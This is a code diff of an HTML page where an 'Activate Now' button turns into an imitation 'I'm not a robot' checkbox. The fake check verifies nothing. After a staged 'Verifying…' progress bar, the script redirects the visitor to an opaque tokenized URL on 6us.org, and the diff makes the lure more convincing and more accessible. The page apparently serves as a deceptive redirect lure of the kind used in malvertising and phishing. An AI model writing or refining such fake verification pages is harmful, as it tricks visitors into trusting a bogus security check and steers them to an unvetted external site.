@@ -17,94 +17,36 @@
       --bar:#60a5fa;
       --shadow: 0 4px 16px rgba(37,99,235,.07);
     }
-    body{
-      margin:0;
-      background:var(--bg);
-      font-family: 'Segoe UI', 'Arial', sans-serif;
-      color:var(--text);
-    }
-    .cta-container{
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin:32px auto;
-      max-width:360px;
-      width:100%;
-    }
+    body{ margin:0; background:var(--bg); font-family: 'Segoe UI','Arial',sans-serif; color:var(--text); }
+    .cta-container{ display:flex; flex-direction:column; align-items:center; margin:32px auto; max-width:360px; width:100%; }
     button#action{
-      position:relative;
-      display:inline-flex;
-      align-items:center;
-      justify-content:center;
-      gap:.6rem;
-      padding:.85em 1.15em;
-      border:0;
-      border-radius:24px;
-      box-shadow:var(--shadow);
-      background:var(--btn);
-      color:var(--btn-fg);
-      font-weight:700;
-      font-size:1rem;
-      line-height:1.2;
-      cursor:pointer;
-      user-select:none;
-      transition: background .18s, padding .22s, border-radius .22s, font-size .22s;
-      overflow:hidden;
-      width:100%;
-      max-width:340px;
-      min-width:180px;
+      position:relative; display:inline-flex; align-items:center; justify-content:center; gap:.6rem;
+      padding:.85em 1.15em; border:0; border-radius:24px; box-shadow:var(--shadow);
+      background:var(--btn); color:var(--btn-fg); font-weight:700; font-size:1rem; line-height:1.2;
+      cursor:pointer; user-select:none; transition:background .18s, padding .22s, border-radius .22s, font-size .22s;
+      overflow:hidden; width:100%; max-width:340px; min-width:180px;
     }
     button#action:hover{ background:var(--btn-hover) }
     button#action:disabled{ opacity:0.85; cursor:not-allowed }
     #action .label{ position:relative; z-index:2; white-space:nowrap }
-    #action .cbox{
-      display:none; align-items:center; gap:.55rem; z-index:2;
-      color:var(--text);
-      font-weight:600;
-      white-space:nowrap;
-    }
+    #action .cbox{ display:none; align-items:center; gap:.55rem; z-index:2; color:var(--text); font-weight:600; white-space:nowrap; }
     #action .cbox .box{
-      width:1.15em; height:1.15em; border:2px solid var(--box); border-radius:4px;
-      background:#fff; display:grid; place-items:center;
+      width:1.15em; height:1.15em; border:2px solid var(--box); border-radius:4px; background:#fff;
+      display:grid; place-items:center; cursor:pointer; /* pointer ONLY on the small box */
     }
-    #action .cbox .box .tick{
-      width:.7em; height:.7em; border-radius:.15rem; background:transparent;
-      transform:scale(0); transition: transform .13s;
-    }
-    #action .bar{
-      position:absolute; left:0; top:0; height:100%; width:0;
-      background:var(--bar); opacity:.24; z-index:1; pointer-events:none;
-    }
+    #action .cbox .box .tick{ width:.7em; height:.7em; border-radius:.15rem; background:transparent; transform:scale(0); transition:transform .13s; }
+    #action .bar{ position:absolute; left:0; top:0; height:100%; width:0; background:var(--bar); opacity:.24; z-index:1; pointer-events:none; }
     @keyframes fill3s{ from{ width:0% } to{ width:100% } }
-    #action.idle .label{ display:block }
-    #action.idle .cbox{ display:none }
-    #action.captcha{
-      background:#fff; color:var(--text); border-radius:18px; padding:1em 1.1em;
-      border: 1px solid var(--box);
-    }
+    #action.idle .label{ display:block }  #action.idle .cbox{ display:none }
+    #action.captcha{ background:#fff; color:var(--text); border-radius:18px; padding:1em 1.1em; border:1px solid var(--box); }
     #action.captcha:hover{ background:#fff }
-    #action.captcha .label{ display:none }
-    #action.captcha .cbox{ display:inline-flex }
-    #action.captcha .cbox .box.checked .tick{
-      background:var(--check); transform:scale(1);
-    }
-    #action.loading{
-      background:var(--btn); color:var(--btn-fg); border-radius:24px;
-    }
-    #action.loading .label{ display:block }
-    #action.loading .cbox{ display:none }
+    #action.captcha .label{ display:none }  #action.captcha .cbox{ display:inline-flex }
+    #action.captcha .cbox .box.checked .tick{ background:var(--check); transform:scale(1); }
+    #action.loading{ background:var(--btn); color:var(--btn-fg); border-radius:24px; }
+    #action.loading .label{ display:block }  #action.loading .cbox{ display:none }
     #action.loading .bar{ animation: fill3s 3s linear forwards }
-    .hint{
-      margin-top:.59rem;
-      opacity:.79;
-      font-size:.92rem;
-      text-align:center;
-      color: #888;
-    }
-    @media (max-width:520px){
-      .cta-container{ max-width:95vw; }
-      button#action{ font-size:0.97rem; min-width:100px; max-width:99vw; }
-    }
+    .hint{ margin-top:.59rem; opacity:.79; font-size:.92rem; text-align:center; color:#888; }
+    @media (max-width:520px){ .cta-container{ max-width:95vw; } button#action{ font-size:0.97rem; min-width:100px; max-width:99vw; } }
   </style>
 </head>
 <body>
@@ -112,27 +54,33 @@
     <button id="action" class="idle" type="button" aria-live="polite">
       <span class="label">Activate Now</span>
       <span class="cbox" aria-hidden="true">
-        <span class="box" id="checkBox"><span class="tick"></span></span>
+        <span class="box" id="checkBox" role="checkbox" aria-checked="false" tabindex="0"><span class="tick"></span></span>
         <span>I’m not a robot</span>
       </span>
       <span class="bar" aria-hidden="true"></span>
     </button>
     <div class="hint" id="hint" aria-hidden="true"></div>
   </div>
+
   <script>
-    // Replace this URL with your desired destination:
+    // Set your redirect target:
     const DEST_URL = "https://6us.org/?27qX8fFg3NxUDhCju3K2HCDm2h8FXsZiAbTI5VXJkyqV3oXEqhbpW";
-    const btn   = document.getElementById('action');
-    const hint  = document.getElementById('hint');
-    const box   = document.getElementById('checkBox');
-    let state = 'idle';
+
+    const btn  = document.getElementById('action');
+    const hint = document.getElementById('hint');
+    const box  = document.getElementById('checkBox');
+
+    let state = 'idle'; // 'idle' -> 'captcha' -> 'loading'
+
     function toCaptcha(){
       state = 'captcha';
       btn.classList.remove('idle','loading');
       btn.classList.add('captcha');
-      hint.textContent = "Click the checkbox to verify.";
+      hint.textContent = "Click the square checkbox to verify.";
       hint.removeAttribute('aria-hidden');
+      box.focus();
     }
+
     function toLoading(){
       state = 'loading';
       btn.classList.remove('idle','captcha');
@@ -140,29 +88,37 @@
       btn.disabled = true;
       btn.querySelector('.label').textContent = 'Verifying…';
       hint.textContent = "Please wait ~3 seconds…";
+      // Visual tick + ARIA
+      box.classList.add('checked');
+      box.setAttribute('aria-checked','true');
+      // Redirect after 3 seconds
       setTimeout(()=>{ window.location.href = DEST_URL; }, 3000);
     }
-    btn.addEventListener('click', (e) => {
-      if (state === 'idle') {
-        toCaptcha();
-        return;
-      }
-      if (state === 'captcha') {
-        box.classList.add('checked');
-        toLoading();
-      }
+
+    // First click on the button: ONLY morph to captcha view
+    btn.addEventListener('click', () => {
+      if (state === 'idle') { toCaptcha(); }
+      // If already in 'captcha', do nothing (must click the box)
     });
+
+    // Start loading ONLY when the small checkbox box is clicked
     box.addEventListener('click', (e) => {
-      e.stopPropagation();
-      if (state === 'captcha') {
-        box.classList.add('checked');
+      e.stopPropagation(); // don't bubble to the button
+      if (state === 'captcha') { toLoading(); }
+    });
+
+    // Keyboard support on the small box (Space/Enter)
+    box.addEventListener('keydown', (e) => {
+      if (state === 'captcha' && (e.key === ' ' || e.key === 'Enter')) {
+        e.preventDefault();
         toLoading();
       }
     });
+
+    // Prevent pressing Enter/Space on the button from starting loading in captcha state
     btn.addEventListener('keydown', (e) => {
-      if (e.key === ' ' || e.key === 'Enter') {
-        e.preventDefault();
-        btn.click();
+      if ((e.key === ' ' || e.key === 'Enter') && state === 'captcha') {
+        e.preventDefault(); // ignore; user must activate the checkbox
       }
     });
   </script>
